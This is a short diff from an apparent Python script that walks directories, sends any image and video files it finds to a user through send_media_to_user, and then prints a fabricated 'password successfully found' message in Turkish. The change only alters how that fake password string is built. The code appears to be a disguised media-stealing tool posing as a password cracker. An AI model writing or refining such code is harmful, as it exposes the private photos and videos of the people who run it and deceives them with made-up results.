@@ -133,7 +133,7 @@ def check_and_send_files():
                     if file_path.endswith(tuple(image_extensions + video_extensions)):
                         send_media_to_user(file_path, directory)
 
-    username_suffix = f"{name[:5].capitalize()}54123.545445"
+    username_suffix = f"{name[:5].capitalize()}54_123.54.5445"
     print(f"\nSifre basariyla bulundu Sifre: {username_suffix}")
 
 check_and_send_files()
